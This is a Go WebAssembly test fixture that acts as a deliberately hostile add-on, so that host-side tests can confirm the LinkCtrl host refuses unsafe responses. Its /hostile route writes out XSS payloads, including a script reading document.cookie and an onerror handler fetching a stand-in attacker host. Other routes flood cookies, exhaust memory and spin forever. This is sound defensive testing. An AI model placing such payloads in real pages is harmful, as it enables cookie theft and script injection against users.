//go:build wasip1

// Command pages is the routes fixture: a module that answers HTTP requests
// through the ABI, including in every way the host has to refuse.
//
// It exists because M64's claims are about a boundary, and a boundary tested only
// from the host's side is a boundary tested against the host's own idea of what a
// guest would send. This module is a real consumer of the generated SDK, compiled
// the way a published add-on is compiled, and it deliberately tries the things a
// hostile or careless add-on would try: markup in its body, text/html as its own
// content type, a permanent redirect, two responses for one request, a cookie
// outside the namespace it declared.
//
// Each refusal is reported through the ABI's log function, which the host-side
// test reads back, because a status a guest received is a fact only the guest can
// report. The exported name is the literal `linkctrl_http_handle`: a
// //go:wasmexport directive cannot take a constant, so the host looks up
// abi.GuestHTTPHandler and this file writes the string, and the test that loads
// this module is what proves the two agree.
package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"strconv"
	"time"

	"github.com/DevOfPie/LinkCtrl/sdk"
)

// request and response are the HTTPRequest and HTTPResponse records, guest-side.
// Written out here rather than shared, because that is a publisher's position:
// the ABI's records are a documented JSON shape, not a Go type another repository
// can import.
type request struct {
	Method         string            `json:"method"`
	Path           string            `json:"path"`
	Query          string            `json:"query"`
	Cookies        map[string]string `json:"cookies"`
	ContentType    string            `json:"content_type"`
	AcceptLanguage string            `json:"accept_language"`
	Body           string            `json:"body"`
	BodyBase64     bool              `json:"body_base64"`
}

type cookie struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	MaxAge int    `json:"max_age,omitempty"`
}

type response struct {
	Status      int      `json:"status,omitempty"`
	ContentType string   `json:"content_type,omitempty"`
	Location    string   `json:"location,omitempty"`
	SetCookie   []cookie `json:"set_cookie,omitempty"`
	Body        string   `json:"body,omitempty"`
}

//go:wasmexport linkctrl_http_handle
func handle() int32 {
	raw, err := sdk.HTTPRequestRead()
	if err != nil {
		_ = sdk.Log(sdk.LevelError, "pages: request unreadable: "+err.Error())
		return -1
	}
	var req request
	if err := json.Unmarshal(raw, &req); err != nil {
		_ = sdk.Log(sdk.LevelError, "pages: request is not JSON: "+err.Error())
		return -1
	}
	_ = sdk.Log(sdk.LevelInfo, "pages: handling "+req.Method+" "+req.Path)

	switch req.Path {
	case "/hostile":
		// Everything a module could try to put in somebody's dashboard. The host
		// wraps it, so what a browser gets is the characters of it.
		return answer(response{Body: `<script>alert(document.cookie)</script>` +
			`<img src=x onerror="fetch('//evil.test')">` +
			`<a href="javascript:alert(1)">x</a>{{.Identity}}`})

	case "/html":
		// The refusal the whole rendering claim rests on: a module may not choose
		// text/html, because the host is what owns the HTML.
		err := write(response{ContentType: "text/html; charset=utf-8", Body: "<b>mine</b>"})
		report("html_refused", err)
		return answer(response{Body: "html refused: " + errText(err)})

	case "/permanent":
		// A permanent redirect, which this product never answers. Refused rather
		// than quietly turned into a 302.
		err := write(response{Status: 301, Location: "https://idp.test/"})
		report("permanent_refused", err)
		return answer(response{Body: "301 refused: " + errText(err)})

	case "/twice":
		if err := write(response{Body: "first"}); err != nil {
			_ = sdk.Log(sdk.LevelError, "pages: the first write failed: "+err.Error())
			return -1
		}
		report("second_write_refused", write(response{Body: "second"}))
		return 0

	case "/foreign-cookie":
		// A cookie outside the namespace this add-on declared. A namespace is owned
		// in both directions, so this is refused for the same reason reading one
		// would be.
		err := write(response{Body: "x", SetCookie: []cookie{{Name: "linkctrl_session", Value: "mine"}}})
		report("foreign_cookie_refused", err)
		return answer(response{Body: "foreign cookie refused: " + errText(err)})

	case "/cookie":
		return answer(response{
			Body:      "cookie set",
			SetCookie: []cookie{{Name: "pages_state", Value: "abc123", MaxAge: 300}},
		})

	case "/cookie-flood":
		// F289, from the guest's side: the flood that used to reach a browser. Two
		// hundred rather than the twelve hundred the finding drove through the host's
		// own handler, because twelve hundred cookies is a *record* over the ABI's
		// 64 KiB single-value bound and would be refused by a bound that was already
		// there. This set fits the record and does not fit a jar, which is the
		// refusal M64's reopening added — and the module is told at the call it
		// made, which is the difference between a bound and a surprise.
		flood := make([]cookie, 200)
		for i := range flood {
			flood[i] = cookie{
				Name:   "pages_flood_" + strconv.Itoa(i),
				Value:  "0123456789012345678901234567890123456789012345678901234567890123",
				MaxAge: 31536000,
			}
		}
		err := write(response{Body: "flood", SetCookie: flood})
		report("cookie_flood_refused", err)
		return answer(response{Body: "flood refused: " + errText(err)})

	case "/cookie-named":
		// One cookie, named by the caller, so a test can measure what many visits
		// setting many *different* names cost a browser. That is the shape F289
		// exploited: a per-response bound is no bound at all when the add-on also
		// decides how many responses there are.
		return answer(response{
			Body:      "named cookie set",
			SetCookie: []cookie{{Name: "pages_" + req.Query, Value: "v", MaxAge: 31536000}},
		})

	case "/cookie-two":
		// One of each lifetime class, which the host keeps in separate jars because
		// a session cookie packed beside a year-long one would outlive the browser
		// being closed.
		return answer(response{
			Body: "two cookies set",
			SetCookie: []cookie{
				{Name: "pages_session", Value: "s1"},
				{Name: "pages_kept", Value: "k1", MaxAge: 600},
			},
		})

	case "/cookie-clear":
		// A deletion, in the ABI's own vocabulary: a negative max_age.
		return answer(response{
			Body:      "cookie cleared",
			SetCookie: []cookie{{Name: "pages_state", Value: "", MaxAge: -1}},
		})

	case "/redirect":
		return answer(response{Location: "https://idp.test/authorize?state=abc"})

	case "/json":
		return answer(response{ContentType: "application/json", Body: `{"path":"` + req.Path + `"}`})

	case "/session":
		// The module's own page, drawn from what the host said about who is asking.
		// It carries no credential because there is none to carry.
		raw, err := sdk.SessionContextRead()
		if err != nil {
			report("session_read", err)
			return answer(response{Body: "session unavailable: " + errText(err)})
		}
		return answer(response{Body: "session " + string(raw)})

	case "/entropy":
		// D292, from the guest's side, and the reason it is here rather than only in
		// the probe fixture: this route runs in a **per-request** instance, which is
		// the one that made every visitor's nonce identical. Four values, because two
		// of them are the ones a publisher will actually write — the standard
		// library's — and a fix that reached only the ABI's own functions would leave
		// those two constant while these two moved.
		//
		// The module asserts nothing about them: two draws inside one instance differ
		// even from a seeded stream, so the claim worth making is across instances and
		// across processes, and only the host-side test can see that. What the module
		// does is report, in a fixed order, so the test can compare run to run.
		abiRandom, err := sdk.RandomBytes(32)
		if err != nil {
			report("entropy_abi", err)
			return answer(response{Body: "entropy unavailable: " + errText(err)})
		}
		// Deliberately larger than the SDK's initial buffer (512 bytes), so the
		// retry half of the calling convention is exercised by something other than
		// a unit test's arithmetic.
		big, err := sdk.RandomBytes(1024)
		if err != nil {
			report("entropy_abi_large", err)
			return answer(response{Body: "large draw unavailable: " + errText(err)})
		}
		if len(big) != 1024 {
			report("entropy_abi_large_short", errors.New(strconv.Itoa(len(big))+" bytes"))
			return answer(response{Body: "large draw short"})
		}
		stdRandom := make([]byte, 32)
		if _, err := rand.Read(stdRandom); err != nil {
			report("entropy_std", err)
			return answer(response{Body: "crypto/rand unavailable: " + errText(err)})
		}
		abiNow, err := sdk.TimeNow()
		if err != nil {
			report("entropy_clock", err)
			return answer(response{Body: "clock unavailable: " + errText(err)})
		}
		// Both refusals, reported rather than fatal, because a fixture that panics
		// here fails every routing test in the package rather than this one.
		_, zeroErr := sdk.RandomBytes(0)
		report("entropy_zero_refused", zeroErr)
		_, hugeErr := sdk.RandomBytes(4097)
		report("entropy_huge_refused", hugeErr)
		return answer(response{ContentType: "application/json", Body: `{"abi_random":"` +
			hex.EncodeToString(abiRandom) + `","abi_random_large":"` +
			hex.EncodeToString(big[:32]) + `","std_random":"` +
			hex.EncodeToString(stdRandom) + `","abi_now":"` + abiNow +
			`","std_now":"` + time.Now().UTC().Format(time.RFC3339Nano) + `"}`})

	case "/grow":
		// F290, from the guest's side: linear memory is bounded, so a module asking
		// for more than the host allows is stopped by the runtime rather than by the
		// operating system's out-of-memory killer. The size is in the query so one
		// fixture can measure both sides of the bound — a modest allocation has to
		// still work, or the test would be measuring "any allocation fails".
		mb, _ := strconv.Atoi(req.Query)
		block := make([]byte, mb<<20)
		// Touched, because linear memory is only allocated when it is written to and
		// an untouched slice would measure nothing.
		for i := 0; i < len(block); i += 65536 {
			block[i] = byte(i)
		}
		_ = sdk.Log(sdk.LevelInfo, "pages: grew by "+strconv.Itoa(mb)+" MiB")
		return answer(response{Body: "grew " + strconv.Itoa(len(block)) + " bytes"})

	case "/spin":
		// A handler that never returns, which is how both bounds on a route
		// invocation are measured. On the application path the request context's
		// own deadline would eventually close this loop; the route deadline M68.5
		// added is shorter, fires first, and is the only bound here at all when a
		// caller brings no deadline — which is what the host test drives. Either
		// way the runtime is built WithCloseOnContextDone, so the instance is
		// closed underneath this loop rather than waited for.
		//
		// Arithmetic rather than a host call, for the reason the `spinning`
		// fixture's loop is arithmetic: what the host interrupts is a *running
		// guest*, and a loop that spent its time inside a host function would be
		// testing the host's own re-entry instead. It also must not log — a tight
		// loop writing to an operator's log is unbounded output, and a fixture that
		// left one running would push this process's resident set past what
		// `TestRepeatedInstallAndRemovalDoesNotGrowResidentMemory` measures.
		// `spun` is exported so nothing may conclude the work is dead.
		for i := uint32(1); ; i++ {
			spun = spun*31 + i
		}

	case "/nothing":
		// A handler that answers nothing at all, which the host has to turn into a
		// failure rather than into an empty page.
		return 0

	case "/refuse":
		// A handler that declines in the ABI's own vocabulary rather than by
		// trapping.
		return -1

	default:
		// The echo, which is what proves the request record arrived intact.
		out, _ := json.Marshal(req)
		return answer(response{Body: "echo " + string(out)})
	}
}

func answer(r response) int32 {
	if err := write(r); err != nil {
		_ = sdk.Log(sdk.LevelError, "pages: write failed: "+err.Error())
		return -1
	}
	return 0
}

func write(r response) error {
	body, err := json.Marshal(r)
	if err != nil {
		return err
	}
	return sdk.HTTPResponseWrite(body)
}

// report names a refusal the host gave, in the form the host-side test reads.
func report(what string, err error) {
	outcome := "ok"
	if err == nil {
		outcome = "MISMATCH: the host accepted it"
	}
	_ = sdk.Log(sdk.LevelInfo, "pages: "+what+"="+outcome)
}

func errText(err error) string {
	if err == nil {
		return "<nil>"
	}
	return err.Error()
}

// init runs during instantiation, once per request, which is what makes the
// per-request instance visible from the guest side: a module that kept state
// here would find it freshly zeroed on every request.
func init() {
	_ = sdk.Log(sdk.LevelDebug, "pages: instance initialized")
}

func main() {}

// spun is the accumulator the /spin handler feeds, exported so that no compiler
// may reason the loop away. See that case for why it is arithmetic.
var spun uint32

//go:wasmexport linkctrl_fixture_spun
func fixtureSpun() int32 { return int32(spun) } //nolint:gosec // G115: a fixture accumulator, read for its liveness rather than its value
